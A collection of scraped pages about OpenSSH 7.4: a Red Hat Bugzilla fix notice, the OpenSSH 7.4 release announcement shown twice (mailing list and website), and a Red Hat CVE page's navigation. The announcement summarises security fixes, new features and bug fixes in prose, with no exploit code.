flaw.   ```  [Comment 4](show_bug.cgi?id=1406286#c4)  errata-xmlrpc    2017-08-01 18:45:35 UTC  ``` This issue has been addressed in the following products:    Red Hat Enterprise Linux 7  Via RHSA-2017:2029 [https://access.redhat.com/errata/RHSA-2017:2029](https://access.redhat.com/errata/RHSA-2017%3A2029)   ``` |  |
| --- | --- |

---

| Note You need to [log in](show_bug.cgi?id=1406286&GoAheadAndLogIn=1) before you can comment on or make changes to this bug. |
| --- |

---

[Privacy](page.cgi?id=redhat/privacy.html)
[Contact](page.cgi?id=redhat/contact.html)
[FAQ](page.cgi?id=faq.html)
[Legal](page.cgi?id=terms-conditions.html)



=== Content from www.openwall.com_bbf8544b_20250125_102958.html ===


| [Openwall](/) * [Products](/)   + [Openwall GNU/\*/Linux  *server OS*](/Owl/)+ [Linux Kernel Runtime Guard](/lkrg/)+ [John the Ripper  *password cracker*](/john/)         - [Free & Open Source for any platform](/john/)- [in the cloud](/john/cloud/)- [Pro for Linux](/john/pro/linux/)- [Pro for macOS](/john/pro/macosx/)+ [Wordlists  *for password cracking*](/wordlists/)+ [passwdqc  *policy enforcement*](/passwdqc/)             - [Free & Open Source for Unix](/passwdqc/)- [Pro for Windows (Active Directory)](/passwdqc/windows/)+ [yescrypt  *KDF & password hashing*](/yescrypt/)+ [yespower  *Proof-of-Work (PoW)*](/yespower/)+ [crypt\_blowfish  *password hashing*](/crypt/)+ [phpass  *ditto in PHP*](/phpass/)+ [tcb  *better password shadowing*](/tcb/)+ [Pluggable Authentication Modules](/pam/)+ [scanlogd  *port scan detector*](/scanlogd/)+ [popa3d  *tiny POP3 daemon*](/popa3d/)+ [blists  *web interface to mailing lists*](/blists/)+ [msulogin  *single user mode login*](/msulogin/)+ [php\_mt\_seed  *mt\_rand() cracker*](/php_mt_seed/)* [Services](/services/)* Publications       + [Articles](/articles/)+ [Presentations](/presentations/)* Resources         + [Mailing lists](/lists/)+ [Community wiki](https://openwall.info/wiki/)+ [Source code repositories (GitHub)](https://github.com/openwall)+ [Source code repositories (CVSweb)](https://cvsweb.openwall.com)+ [File archive & mirrors](/mirrors/)+ [How to verify digital signatures](/signatures/)+ [OVE IDs](/ove/)* [What's new](/news) | |
| --- | --- |

| | [Hash Suite - Windows password security audit tool. GUI, reports in PDF.](https://hashsuite.openwall.net) | | --- | |
| --- | --- |

[[<prev]](1) [[next>]](3) [[thread-next>]](5) [[day]](.) [[month]](..) [[year]](../..) [[list]](../../..)
```

Message-Id: <4ab69cb56675d73a@openbsd.org>
Date: Mon, 19 Dec 2016 06:56:04 -0700 (MST)
From: Damien Miller <djm@...nbsd.org>
To: oss-security@...ts.openwall.com
Subject: Announce: OpenSSH 7.4 released

OpenSSH 7.4 has just been released. It will be available from the
mirrors listed at <http://www.openssh.com/> shortly.

OpenSSH is a 100% complete SSH protocol 2.0 implementation and
includes sftp client and server support. OpenSSH also includes
transitional support for the legacy SSH 1.3 and 1.5 protocols
that may be enabled at compile-time.

Once again, we would like to thank the OpenSSH community for their
continued support of the project, especially those who contributed
code or patches, reported bugs, tested snapshots or donated to the
project. More information on donations may be found at:
<http://www.openssh.com/donations.html>

Future deprecation notice
=========================

We plan on retiring more legacy cryptography in future releases,
specifically:

 * In approximately August 2017, removing remaining support for the
   SSH v.1 protocol (client-only and currently compile-time disabled).

 * In the same release, removing support for Blowfish and RC4 ciphers
   and the RIPE-MD160 HMAC. (These are currently run-time disabled).

 * Refusing all RSA keys smaller than 1024 bits (the current minimum
   is 768 bits)

 * The next release of OpenSSH will remove support for running sshd(8)
   with privilege separation disabled.

 * The next release of portable OpenSSH will remove support for
   OpenSSL version prior to 1.0.1.

This list reflects our current intentions, but please check the final
release notes for future releases.

Potentially-incompatible changes
================================

This release includes a number of changes that may affect existing
configurations:

 * This release removes server support for the SSH v.1 protocol.

 * ssh(1): Remove 3des-cbc from the client's default proposal. 64-bit
   block ciphers are not safe in 2016 and we don't want to wait until
   attacks like SWEET32 are extended to SSH. As 3des-cbc was the
   only mandatory cipher in the SSH RFCs, this may cause problems
   connecting to older devices using the default configuration,
   but it's highly likely that such devices already need explicit
   configuration for key exchange and hostkey algorithms already
   anyway.

 * sshd(8): Remove support for pre-authentication compression.
   Doing compression early in the protocol probably seemed reasonable
   in the 1990s, but today it's clearly a bad idea in terms of both
   cryptography (cf. multiple compression oracle attacks in TLS) and
   attack surface. Pre-auth compression support has been disabled by
   default for >10 years. Support remains in the client.

 * ssh-agent will refuse to load PKCS#11 modules outside a whitelist
   of trusted paths by default. The path whitelist may be specified
   at run-time.

 * sshd(8): When a forced-command appears in both a certificate and
   an authorized keys/principals command= restriction, sshd will now
   refuse to accept the certificate unless they are identical.
   The previous (documented) behaviour of having the certificate
   forced-command override the other could be a bit confusing and
   error-prone.

 * sshd(8): Remove the UseLogin configuration directive and support
   for having /bin/login manage login sessions.

Changes since OpenSSH 7.3
=========================

This is primarily a bugfix release.

Security
--------

 * ssh-agent(1): Will now refuse to load PKCS#11 modules from paths
   outside a trusted whitelist (run-time configurable). Requests to
   load modules could be passed via agent forwarding and an attacker
   could attempt to load a hostile PKCS#11 module across the forwarded
   agent channel: PKCS#11 modules are shared libraries, so this would
   result in code execution on the system running the ssh-agent if the
   attacker has control of the forwarded agent-socket (on the host
   running the sshd server) and the ability to write to the filesystem
   of the host running ssh-agent (usually the host running the ssh
   client). Reported by Jann Horn of Project Zero.

 * sshd(8): When privilege separation is disabled, forwarded Unix-
   domain sockets would be created by sshd(8) with the privileges of
   'root' instead of the authenticated user. This release refuses
   Unix-domain socket forwarding when privilege separation is disabled
   (Privilege separation has been enabled by default for 14 years).
   Reported by Jann Horn of Project Zero.

 * sshd(8): Avoid theoretical leak of host private key material to
   privilege-separated child processes via realloc() when reading
   keys. No such leak was observed in practice for normal-sized keys,
   nor does a leak to the child processes directly expose key material
   to unprivileged users. Reported by Jann Horn of Project Zero.

 * sshd(8): The shared memory manager used by pre-authentication
   compression support had a bounds checks that could be elided by
   some optimising compilers. Additionally, this memory manager was
   incorrectly accessible when pre-authentication compression was
   disabled. This could potentially allow attacks against the
   privileged monitor process from the sandboxed privilege-separation
   process (a compromise of the latter would be required first).
   This release removes support for pre-authentication compression
   from sshd(8). Reported by Guido Vranken using the Stack unstable
   optimisation identification tool (<http://css.csail.mit.edu/stack/>)

 * sshd(8): Fix denial-of-service condition where an attacker who
   sends multiple KEXINIT messages may consume up to 128MB per
   connection. Reported by Shi Lei of Gear Team, Qihoo 360.

 * sshd(8): Validate address ranges for AllowUser and DenyUsers
   directives at configuration load time and refuse to accept invalid
   ones. It was previously possible to specify invalid CIDR address
   ranges (e.g. user@....1.2.3/55) and these would always match,
   possibly resulting in granting access where it was not intended.
   Reported by Laurence Parry.

New Features
------------

 * ssh(1): Add a proxy multiplexing mode to ssh(1) inspired by the
   version in PuTTY by Simon Tatham. This allows a multiplexing
   client to communicate with the master process using a subset of
   the SSH packet and channels protocol over a Unix-domain socket,
   with the main process acting as a proxy that translates channel
   IDs, etc.  This allows multiplexing mode to run on systems that
   lack file- descriptor passing (used by current multiplexing
   code) and potentially, in conjunction with Unix-domain socket
   forwarding, with the client and multiplexing master process on
   different machines. Multiplexing proxy mode may be invoked using
   "ssh -O proxy ..."

 * sshd(8): Add a sshd_config DisableForwaring option that disables
   X11, agent, TCP, tunnel and Unix domain socket forwarding, as well
   as anything else we might implement in the future. Like the
   'restrict' authorized_keys flag, this is intended to be a simple
   and future-proof way of restricting an account.

 * sshd(8), ssh(1): Support the "curve25519-sha256" key exchange
   method. This is identical to the currently-supported method named
   "curve25519-sha256@...ssh.org".

 * sshd(8): Improve handling of SIGHUP by checking to see if sshd is
   already daemonised at startup and skipping the call to daemon(3)
   if it is. This ensures that a SIGHUP restart of sshd(8) will
   retain the same process-ID as the initial execution. sshd(8) will
   also now unlink the PidFile prior to SIGHUP restart and re-create
   it after a successful restart, rather than leaving a stale file in
   the case of a configuration error. bz#2641

 * sshd(8): Allow ClientAliveInterval and ClientAliveCountMax
   directives to appear in sshd_config Match blocks.

 * sshd(8): Add %-escapes to AuthorizedPrincipalsCommand to match
   those supported by AuthorizedKeysCommand (key, key type,
   fingerprint, etc.) and a few more to provide access to the
   contents of the certificate being offered.

 * Added regression tests for string matching, address matching and
   string sanitisation functions.

 * Improved the key exchange fuzzer harness.

Bugfixes
--------

 * ssh(1): Allow IdentityFile to successfully load and use
   certificates that have no corresponding bare public key. bz#2617
   certificate id_rsa-cert.pub (and no id_rsa.pub).

 * ssh(1): Fix public key authentication when multiple
   authentication is in use and publickey is not just the first
   method attempted. bz#2642

 * regress: Allow the PuTTY interop tests to run unattended. bz#2639

 * ssh-agent(1), ssh(1): improve reporting when attempting to load
   keys from PKCS#11 tokens with fewer useless log messages and more
   detail in debug messages. bz#2610

 * ssh(1): When tearing down ControlMaster connections, don't
   pollute stderr when LogLevel=quiet.

 * sftp(1): On ^Z wait for underlying ssh(1) to suspend before
   suspending sftp(1) to ensure that ssh(1) restores the terminal mode
   correctly if suspended during a password prompt.

 * ssh(1): Avoid busy-wait when ssh(1) is suspended during a password
   prompt.

 * ssh(1), sshd(8): Correctly report errors during sending of ext-
   info messages.

 * sshd(8): fix NULL-deref crash if sshd(8) received an out-of-
   sequence NEWKEYS message.

 * sshd(8): Correct list of supported signature algorithms sent in
   the server-sig-algs extension. bz#2547

 * sshd(8): Fix sending ext_info message if privsep is disabled.

 * sshd(8): more strictly enforce the expected ordering of privilege
   separation monitor calls used for authentication and allow them
   only when their respective authentication methods are enabled
   in the configuration

 * sshd(8): Fix uninitialised optlen in getsockopt() call; harmless
   on Unix/BSD but potentially crashy on Cygwin.

 * Fix false positive reports caused by explicit_bzero(3) not being
   recognised as a memory initialiser when compiled with
   -fsanitize-memory.

 * sshd_config(5): Use 2001:db8::/32, the official IPv6 subnet for
   configuration examples.

Portability
-----------

 * On environments configured with Turkish locales, fall back to the
   C/POSIX locale to avoid errors in configuration parsing caused by
   that locale's unique handling of the letters 'i' and 'I'. bz#2643

 * sftp-server(8), ssh-agent(1): Deny ptrace on OS X using
   ptrace(PT_DENY_ATTACH, ..)

 * ssh(1), sshd(8): Unbreak AES-CTR ciphers on old (~0.9.8) OpenSSL.

 * Fix compilation for libcrypto compiled without RIPEMD160 support.

 * contrib: Add a gnome-ssh-askpass3 with GTK+3 support. bz#2640

 * sshd(8): Improve PRNG reseeding across privilege separation and
   force libcrypto to obtain a high-quality seed before chroot or
   sandboxing.

 * All: Explicitly test for broken strnvis. NetBSD added an strnvis
   and unfortunately made it incompatible with the existing one in
   OpenBSD and Linux's libbsd (the former having existed for over ten
   years). Try to detect this mess, and assume the only safe option
   if we're cross compiling.

Checksums:
==========

 - SHA1 (openssh-7.4.tar.gz) = 1e2073f95d5ead8f2814b4b6c0700bcd533c410f
 - SHA1 (openssh-7.4p1.tar.gz) = 2330bbf82ed08cf3ac70e0acf00186ef3eeb97e0

 - SHA256 (openssh-7.4.tar.gz) = +GEXh7Xr2J87cq1uA97hF9e+3lfOQ2LKxXGdmFXREf0
 - SHA256 (openssh-7.4p1.tar.gz) = Gx/EoU4gJCkxgZJO0khy5vLgYpPz6JJqN2uK7EgfGdE=

Please note that the SHA256 signatures are base64 encoded and not
hexadecimal (which is the default for most checksum tools). The PGP
key used to sign the releases is available as RELEASE_KEY.asc from
the mirror sites.

Reporting Bugs:
===============

- Please read <http://www.openssh.com/report.html>
  Security bugs should be reported directly to openssh@...nssh.com

OpenSSH is brought to you by Markus Friedl, Niels Provos, Theo de
Raadt, Kevin Steves, Damien Miller, Darren Tucker, Jason McIntyre,
Tim Rice and Ben Lindstrom.

```

[Powered by blists](https://www.openwall.com/blists/) - [more mailing lists](https://lists.openwall.net)

Please check out the
[Open Source Software Security Wiki](https://oss-security.openwall.org/wiki/), which is counterpart to this
[mailing list](https://oss-security.openwall.org/wiki/mailing-lists/oss-security).

Confused about [mailing lists](/lists/) and their use?
[Read about mailing lists on Wikipedia](https://en.wikipedia.org/wiki/Electronic_mailing_list)
and check out these
[guidelines on proper formatting of your messages](https://www.complang.tuwien.ac.at/anton/mail-news-errors.html).



=== Content from www.openssh.com_6f042d16_20250126_080147.html ===
OpenSSH 7.4 was released on 2016-12-19. It is available from the
mirrors listed at https://www.openssh.com/.
OpenSSH is a 100% complete SSH protocol 2.0 implementation and
includes sftp client and server support. OpenSSH also includes
transitional support for the legacy SSH 1.3 and 1.5 protocols
that may be enabled at compile-time.
Once again, we would like to thank the OpenSSH community for their
continued support of the project, especially those who contributed
code or patches, reported bugs, tested snapshots or donated to the
project. More information on donations may be found at:
http://www.openssh.com/donations.html
Future deprecation notice
=========================
We plan on retiring more legacy cryptography in future releases,
specifically:
\* In approximately August 2017, removing remaining support for the
SSH v.1 protocol (client-only and currently compile-time disabled).
\* In the same release, removing support for Blowfish and RC4 ciphers
and the RIPE-MD160 HMAC. (These are currently run-time disabled).
\* Refusing all RSA keys smaller than 1024 bits (the current minimum
is 768 bits)
\* The next release of OpenSSH will remove support for running sshd(8)
with privilege separation disabled.
\* The next release of portable OpenSSH will remove support for
OpenSSL version prior to 1.0.1.
This list reflects our current intentions, but please check the final
release notes for future releases.
Potentially-incompatible changes
================================
This release includes a number of changes that may affect existing
configurations:
\* This release removes server support for the SSH v.1 protocol.
\* ssh(1): Remove 3des-cbc from the client's default proposal. 64-bit
block ciphers are not safe in 2016 and we don't want to wait until
attacks like SWEET32 are extended to SSH. As 3des-cbc was the
only mandatory cipher in the SSH RFCs, this may cause problems
connecting to older devices using the default configuration,
but it's highly likely that such devices already need explicit
configuration for key exchange and hostkey algorithms already
anyway.
\* sshd(8): Remove support for pre-authentication compression.
Doing compression early in the protocol probably seemed reasonable
in the 1990s, but today it's clearly a bad idea in terms of both
cryptography (cf. multiple compression oracle attacks in TLS) and
attack surface. Pre-auth compression support has been disabled by
default for >10 years. Support remains in the client.
\* ssh-agent will refuse to load PKCS#11 modules outside a whitelist
of trusted paths by default. The path whitelist may be specified
at run-time.
\* sshd(8): When a forced-command appears in both a certificate and
an authorized keys/principals command= restriction, sshd will now
refuse to accept the certificate unless they are identical.
The previous (documented) behaviour of having the certificate
forced-command override the other could be a bit confusing and
error-prone.
\* sshd(8): Remove the UseLogin configuration directive and support
for having /bin/login manage login sessions.
Changes since OpenSSH 7.3
=========================
This is primarily a bugfix release.
Security
--------
\* ssh-agent(1): Will now refuse to load PKCS#11 modules from paths
outside a trusted whitelist (run-time configurable). Requests to
load modules could be passed via agent forwarding and an attacker
could attempt to load a hostile PKCS#11 module across the forwarded
agent channel: PKCS#11 modules are shared libraries, so this would
result in code execution on the system running the ssh-agent if the
attacker has control of the forwarded agent-socket (on the host
running the sshd server) and the ability to write to the filesystem
of the host running ssh-agent (usually the host running the ssh
client). Reported by Jann Horn of Project Zero.
\* sshd(8): When privilege separation is disabled, forwarded Unix-
domain sockets would be created by sshd(8) with the privileges of
'root' instead of the authenticated user. This release refuses
Unix-domain socket forwarding when privilege separation is disabled
(Privilege separation has been enabled by default for 14 years).
Reported by Jann Horn of Project Zero.
\* sshd(8): Avoid theoretical leak of host private key material to
privilege-separated child processes via realloc() when reading
keys. No such leak was observed in practice for normal-sized keys,
nor does a leak to the child processes directly expose key material
to unprivileged users. Reported by Jann Horn of Project Zero.
\* sshd(8): The shared memory manager used by pre-authentication
compression support had a bounds checks that could be elided by
some optimising compilers. Additionally, this memory manager was
incorrectly accessible when pre-authentication compression was
disabled. This could potentially allow attacks against the
privileged monitor process from the sandboxed privilege-separation
process (a compromise of the latter would be required first).
This release removes support for pre-authentication compression
from sshd(8). Reported by Guido Vranken using the Stack unstable
optimisation identification tool (http://css.csail.mit.edu/stack/)
\* sshd(8): Fix denial-of-service condition where an attacker who
sends multiple KEXINIT messages may consume up to 128MB per
connection. Reported by Shi Lei of Gear Team, Qihoo 360.
\* sshd(8): Validate address ranges for AllowUser and DenyUsers
directives at configuration load time and refuse to accept invalid
ones. It was previously possible to specify invalid CIDR address
ranges (e.g. user@127.1.2.3/55) and these would always match,
possibly resulting in granting access where it was not intended.
Reported by Laurence Parry.
New Features
------------
\* ssh(1): Add a proxy multiplexing mode to ssh(1) inspired by the
version in PuTTY by Simon Tatham. This allows a multiplexing
client to communicate with the master process using a subset of
the SSH packet and channels protocol over a Unix-domain socket,
with the main process acting as a proxy that translates channel
IDs, etc. This allows multiplexing mode to run on systems that
lack file- descriptor passing (used by current multiplexing
code) and potentially, in conjunction with Unix-domain socket
forwarding, with the client and multiplexing master process on
different machines. Multiplexing proxy mode may be invoked using
"ssh -O proxy ..."
\* sshd(8): Add a sshd\_config DisableForwarding option that disables
X11, agent, TCP, tunnel and Unix domain socket forwarding, as well
as anything else we might implement in the future. Like the
'restrict' authorized\_keys flag, this is intended to be a simple
and future-proof way of restricting an account.
\* sshd(8), ssh(1): Support the "curve25519-sha256" key exchange
method. This is identical to the currently-supported method named
"curve25519-sha256@libssh.org".
\* sshd(8): Improve handling of SIGHUP by checking to see if sshd is
already daemonised at startup and skipping the call to daemon(3)
if it is. This ensures that a SIGHUP restart of sshd(8) will
retain the same process-ID as the initial execution. sshd(8) will
also now unlink the PidFile prior to SIGHUP restart and re-create
it after a successful restart, rather than leaving a stale file in
the case of a configuration error. bz#2641
\* sshd(8): Allow ClientAliveInterval and ClientAliveCountMax
directives to appear in sshd\_config Match blocks.
\* sshd(8): Add %-escapes to AuthorizedPrincipalsCommand to match
those supported by AuthorizedKeysCommand (key, key type,
fingerprint, etc.) and a few more to provide access to the
contents of the certificate being offered.
\* Added regression tests for string matching, address matching and
string sanitisation functions.
\* Improved the key exchange fuzzer harness.
Bugfixes
--------
\* ssh(1): Allow IdentityFile to successfully load and use
certificates that have no corresponding bare public key. bz#2617
certificate id\_rsa-cert.pub (and no id\_rsa.pub).
\* ssh(1): Fix public key authentication when multiple
authentication is in use and publickey is not just the first
method attempted. bz#2642
\* regress: Allow the PuTTY interop tests to run unattended. bz#2639
\* ssh-agent(1), ssh(1): improve reporting when attempting to load
keys from PKCS#11 tokens with fewer useless log messages and more
detail in debug messages. bz#2610
\* ssh(1): When tearing down ControlMaster connections, don't
pollute stderr when LogLevel=quiet.
\* sftp(1): On ^Z wait for underlying ssh(1) to suspend before
suspending sftp(1) to ensure that ssh(1) restores the terminal mode
correctly if suspended during a password prompt.
\* ssh(1): Avoid busy-wait when ssh(1) is suspended during a password
prompt.
\* ssh(1), sshd(8): Correctly report errors during sending of ext-
info messages.
\* sshd(8): fix NULL-deref crash if sshd(8) received an out-of-
sequence NEWKEYS message.
\* sshd(8): Correct list of supported signature algorithms sent in
the server-sig-algs extension. bz#2547
\* sshd(8): Fix sending ext\_info message if privsep is disabled.
\* sshd(8): more strictly enforce the expected ordering of privilege
separation monitor calls used for authentication and allow them
only when their respective authentication methods are enabled
in the configuration
\* sshd(8): Fix uninitialised optlen in getsockopt() call; harmless
on Unix/BSD but potentially crashy on Cygwin.
\* Fix false positive reports caused by explicit\_bzero(3) not being
recognised as a memory initialiser when compiled with
-fsanitize-memory.
\* sshd\_config(5): Use 2001:db8::/32, the official IPv6 subnet for
configuration examples.
Portability
-----------
\* On environments configured with Turkish locales, fall back to the
C/POSIX locale to avoid errors in configuration parsing caused by
that locale's unique handling of the letters 'i' and 'I'. bz#2643
\* sftp-server(8), ssh-agent(1): Deny ptrace on OS X using
ptrace(PT\_DENY\_ATTACH, ..)
\* ssh(1), sshd(8): Unbreak AES-CTR ciphers on old (~0.9.8) OpenSSL.
\* Fix compilation for libcrypto compiled without RIPEMD160 support.
\* contrib: Add a gnome-ssh-askpass3 with GTK+3 support. bz#2640
\* sshd(8): Improve PRNG reseeding across privilege separation and
force libcrypto to obtain a high-quality seed before chroot or
sandboxing.
\* All: Explicitly test for broken strnvis. NetBSD added an strnvis
and unfortunately made it incompatible with the existing one in
OpenBSD and Linux's libbsd (the former having existed for over ten
years). Try to detect this mess, and assume the only safe option
if we're cross compiling.
Checksums:
==========
- SHA1 (openssh-7.4.tar.gz) = 1e2073f95d5ead8f2814b4b6c0700bcd533c410f
- SHA1 (openssh-7.4p1.tar.gz) = 2330bbf82ed08cf3ac70e0acf00186ef3eeb97e0
- SHA256 (openssh-7.4.tar.gz) = +GEXh7Xr2J87cq1uA97hF9e+3lfOQ2LKxXGdmFXREf0
- SHA256 (openssh-7.4p1.tar.gz) = Gx/EoU4gJCkxgZJO0khy5vLgYpPz6JJqN2uK7EgfGdE=
Please note that the SHA256 signatures are base64 encoded and not
hexadecimal (which is the default for most checksum tools). The PGP
key used to sign the releases is available as RELEASE\_KEY.asc from
the mirror sites.
Reporting Bugs:
===============
- Please read http://www.openssh.com/report.html
Security bugs should be reported directly to openssh@openssh.com
OpenSSH is brought to you by Markus Friedl, Niels Provos, Theo de
Raadt, Kevin Steves, Damien Miller, Darren Tucker, Jason McIntyre,
Tim Rice and Ben Lindstrom.


=== Content from www.redhat.com_76ebf16a_20250126_080148.html ===


[Skip to navigation](#pfe-navigation)
[Skip to main content](#cp-main)
### Utilities

* [Subscriptions](https://access.redhat.com/management/)
* [Downloads](https://access.redhat.com/downloads/)
* [Red Hat Console](//console.redhat.com/)
* [Get Support](https://access.redhat.com/support/)

[![Red Hat Customer Portal](https://access.redhat.com/chrome_themes/nimbus/img/red-hat-customer-portal.svg)](https://access.redhat.com/)

* [Subscriptions](https://access.redhat.com/management/)
* [Downloads](https://access.redhat.com/downloads/)
* [Red Hat Console](//console.redhat.com/)
* [Get Support](https://access.redhat.com/support/)
* [Products](https://access.redhat.com/)
  ### Top Products

  + [Red Hat Enterprise Linux](https://access.redhat.com/products/red-hat-enterprise-linux/)
  + [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform)
  + [Red Hat Ansible Automation Platform](https://access.redhat.com/products/red-hat-ansible-automation-platform/)
  [All Products](https://access.redhat.com/products/)

  ### Downloads and Containers

  + [Downloads](https://access.redhat.com/downloads/)
  + [Packages](https://access.redhat.com/downloads/content/package-browser)
  + [Containers](https://catalog.redhat.com/software/containers/explore/)
  ### Top Resources

  + [Documentation](//docs.redhat.com/)
  + [Product Life Cycles](https://access.redhat.com/product-life-cycles/)
  + [Product Compliance](https://access.redhat.com/articles/1202803)
  + [Errata](https://access.redhat.com/errata/)
* [Knowledge](https://access.redhat.com/labs/)
  ### Red Hat Knowledge Center

  + [Knowledgebase Solutions](https://access.redhat.com/search/?q=*&p=1&rows=10&documentKind=Solution)
  + [Knowledgebase Articles](https://access.redhat.com/search/?q=*&p=1&rows=10&documentKind=Article)
  + [Customer Portal Labs](https://access.redhat.com/labs/)
  + [Errata](https://access.redhat.com/errata/)
  ### Top Product Docs

  + [Red Hat Enterprise Linux](//docs.redhat.com/en/documentation/red_hat_enterprise_linux/)
  + [Red Hat OpenShift](//docs.redhat.com/en/documentation/openshift_container_platform/)
  + [Red Hat Ansible Automation Platform](//docs.redhat.com/en/documentation/red_hat_ansible_automation_platform/)
  [All Product Docs](//docs.redhat.com/en/products)

  ### [Training and Certification](//www.redhat.com/en/services/training-and-certification)

  + [About](//www.redhat.com/en/services/training-and-certification)
  + [Course Index](//www.redhat.com/en/services/training/all-courses-exams)
  + [Certification Index](//www.redhat.com/en/services/certifications)
  + [Skill Assessment](//skills.ole.redhat.com/)
* [Security](https://access.redhat.com/security/)
  ### [Red Hat Product Security Center](https://access.redhat.com/security)

  + [Security Updates](https://access.redhat.com/security)
  + [Security Advisories](https://access.redhat.com/security/security-updates/#/security-advisories)
  + [Red Hat CVE Database](https://access.redhat.com/security/security-updates/#/cve)
  + [Errata](https://access.redhat.com/errata/)
  ### References

  + [Security Bulletins](https://access.redhat.com/security/vulnerabilities)
  + [Security Measurement](https://www.redhat.com/security/data/metrics/)
  + [Severity Ratings](https://access.redhat.com/security/updates/classification/)
  + [Security Data](https://access.redhat.com/security/data)
  ### Top Resources

  + [Security Labs](https://access.redhat.com/security/security-updates/#/security-labs)
  + [Backporting Policies](https://access.redhat.com/security/updates/backporting/)
  + [Security Blog](//redhat.com/en/blog/channel/security)
* [Support](https://access.redhat.com/support/)
  ### [Red Hat Support](https://access.redhat.com/support/)

  + [Support Cases](https://access.redhat.com/support/cases/)
  + [Troubleshoot](https://access.redhat.com/support/cases/#/troubleshoot)
  + [Get Support](https://access.redhat.com/support/)
  + [Contact Red Hat Support](https://access.redhat.com/support/contact/)
  ### [Red Hat Community Support](https://access.redhat.com/community)

  + [Customer Portal Community](https://access.redhat.com/community/)
  + [Community Discussions](https://access.redhat.com/discussions/)
  + [Red Hat Accelerator Program](https://access.redhat.com/accelerators/)
  ### Top Resources

  + [Product Life Cycles](https://access.redhat.com/product-life-cycles/)
  + [Customer Portal Labs](https://access.redhat.com/labs/)
  + [Red Hat JBoss Supported Configurations](https://access.redhat.com/support/configurations/jboss)
  + [Red Hat Insights](https://cloud.redhat.com/insights)

Or [troubleshoot an issue](/support/cases/#/troubleshoot).

English

## Select Your Language

* [English](https://access.redhat.com/changeLanguage?language=en)
* [Franais](https://access.redhat.com/changeLanguage?language=fr)
* [](https://access.redhat.com/changeLanguage?language=ko)
* [](https://access.redhat.com/changeLanguage?language=ja)
* [ ()](https://access.redhat.com/changeLanguage?language=zh_CN)

### Infrastructure and Management

* [Red Hat Enterprise Linux](https://access.redhat.com/products/red-hat-enterprise-linux/)
* [Red Hat Satellite](https://access.redhat.com/products/red-hat-satellite/)
* [Red Hat Subscription Management](https://access.redhat.com/products/red-hat-subscription-management/)
* [Red Hat Insights](https://access.redhat.com/products/red-hat-insights/)
* [Red Hat Ansible Automation Platform](https://access.redhat.com/products/red-hat-ansible-automation-platform/)
### Cloud Computing

* [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform)
* [Red Hat OpenStack Platform](https://access.redhat.com/products/red-hat-openstack-platform/)
* [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform/)
* [Red Hat OpenShift AI](https://access.redhat.com/products/red-hat-openshift-ai/)
* [Red Hat OpenShift Dedicated](https://access.redhat.com/products/openshift-dedicated-red-hat/)
* [Red Hat Advanced Cluster Security for Kubernetes](https://access.redhat.com/products/red-hat-advanced-cluster-security-for-kubernetes/)
* [Red Hat Advanced Cluster Management for Kubernetes](https://access.redhat.com/products/red-hat-advanced-cluster-management-for-kubernetes/)
* [Red Hat Quay](https://access.redhat.com/products/red-hat-quay/)
* [Red Hat OpenShift Dev Spaces](https://access.redhat.com/products/red-hat-openshift-dev-spaces)
* [Red Hat OpenShift Service on AWS](https://access.redhat.com/products/red-hat-openshift-service-aws)
### Storage

* [Red Hat Gluster Storage](https://access.redhat.com/products/red-hat-storage/)
* [Red Hat Hyperconverged Infrastructure](https://access.redhat.com/products/red-hat-hyperconverged-infrastructure/)
* [Red Hat Ceph Storage](https://access.redhat.com/products/red-hat-ceph-storage/)
* [Red Hat OpenShift Data Foundation](https://access.redhat.com/products/red-hat-openshift-data-foundation)
### Runtimes

* [Red Hat Runtimes](https://access.redhat.com/products/red-hat-runtimes/)
* [Red Hat JBoss Enterprise Application Platform](https://access.redhat.com/products/red-hat-jboss-enterprise-application-platform/)
* [Red Hat Data Grid](https://access.redhat.com/products/red-hat-data-grid/)
* [Red Hat JBoss Web Server](https://access.redhat.com/products/red-hat-jboss-web-server/)
* [Red Hat build of Keycloak](https://access.redhat.com/products/red-hat-build-of-keycloak/)
* [Red Hat support for Spring Boot](https://access.redhat.com/products/spring-boot/)
* [Red Hat build of Node.js](https://access.redhat.com/products/nodejs/)
* [Red Hat build of Quarkus](https://access.redhat.com/products/quarkus/)
### Integration and Automation

* [Red Hat Application Foundations](https://access.redhat.com/products/red-hat-application-foundations/)
* [Red Hat Fuse](https://access.redhat.com/products/red-hat-fuse/)
* [Red Hat AMQ](https://access.redhat.com/products/red-hat-amq/)
* [Red Hat 3scale API Management](https://access.redhat.com/products/red-hat-3scale/)

[All Products](https://access.redhat.com/products/)

**We're sorry but cve-details doesn't work properly without JavaScript enabled. Please enable it to continue.**

[![Red Hat](https://static.redhat.com/libs/redhat/brand-assets/2/corp/logo--on-dark.svg)](https://redhat.com/en)
[X (formerly Twitter)](https://twitter.com/RedHat)
### Quick Links

* [Downloads](https://access.redhat.com/downloads/)
* [Subscriptions](https://access.redhat.com/management)
* [Support Cases](https://access.redhat.com/support)
* [Customer Service](https://access.redhat.com/support/customer-service)
* [Product Documentation](//docs.redhat.com/)

### Help

* [Contact Us](https://access.redhat.com/support/contact/)
* [Customer Portal FAQ](https://access.redhat.com/articles/33844)
* [Log-in Assistance](https://access.redhat.com/help/login_assistance)

### Site Info

* [Trust Red Hat](https://www.redhat.com/en/trust)
* [Browser Support Policy](https://www.redhat.com/en/about/browser-support)
* [Accessibility](https://www.redhat.com/en/about/digital-accessibility)
* [Awards and Recognition](https://access.redhat.com/recognition/)
* [Colophon](https://access.redhat.com/help/colophon/)

### Related Sites

* [redhat.com](https://www.redhat.com/)
* [developers.redhat.com](http://developers.redhat.com/)
* [connect.redhat.com](https://connect.redhat.com/)
* [cloud.redhat.com](https://cloud.redhat.com/)

### Red Hat legal and privacy links

* [About Red Hat](https://redhat.com/en/about/company)
* [Jobs](https://redhat.com/en/jobs)
* [Events](https://redhat.com/en/events)
* [Locations](https://redhat.com/en/about/office-locations)
* [Contact Red Hat](https://redhat.com/en/contact)
* [Red Hat Blog](https://redhat.com/en/blog)
* [Diversity, equity, and inclusion](https://redhat.com/en/about/our-culture/diversity-equity-inclusion)
* [Cool Stuff Store](https://coolstuff.redhat.com/)
* [Red Hat Summit](https://www.redhat.com/en/summit)

  2025 Red Hat, Inc.
### Red Hat legal and privacy links

* [Privacy statement](https://redhat.com/en/about/privacy-policy)
* [Terms of use](https://redhat.com/en/about/terms-use)
